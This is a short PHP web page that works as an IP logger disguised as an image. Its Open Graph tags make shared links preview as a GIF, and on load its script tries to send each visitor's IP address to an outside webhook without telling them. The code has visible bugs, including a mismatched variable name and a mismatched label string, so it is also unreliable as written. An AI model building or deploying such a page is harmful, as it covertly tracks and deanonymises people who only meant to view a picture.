<?php
function ip() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

$ip = ip();

header('Content-Type: text/html');
?>
<!DOCTYPE html>
<html>
<head>
  <meta property="og:image" content="https://raw.githubusercontent.com/agenericapple/files/main/gifs/shikanoko.gif">
  <meta property="og:type" content="image">
</head>
<body>
  <script>
    function post() {
      const ip = document.querySelector('div#user-ip').textContent.replace('User IP Address: ', '');
      const ul = 'https://hkdk.events/cy2t824c3u09rn';
      const data = new URLSearchParams();
      data.append('ip', ip);

      fetch(url, {
        method: 'POST',
        body: data,
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
        },
      })
      .then(response => {
        if (response.ok) {
          console.log('IP address posted successfully.');
        } else {
          console.error('Error posting IP address:', response.statusText);
        }
      })
      .catch(error => {
        console.error('Error posting IP address:', error);
      });
    }

    post();
  </script>
  <?php
    echo '<div id="user-ip">IP Address: ' . htmlspecialchars($ip) . '</div>';
  ?>
</body>
</html>
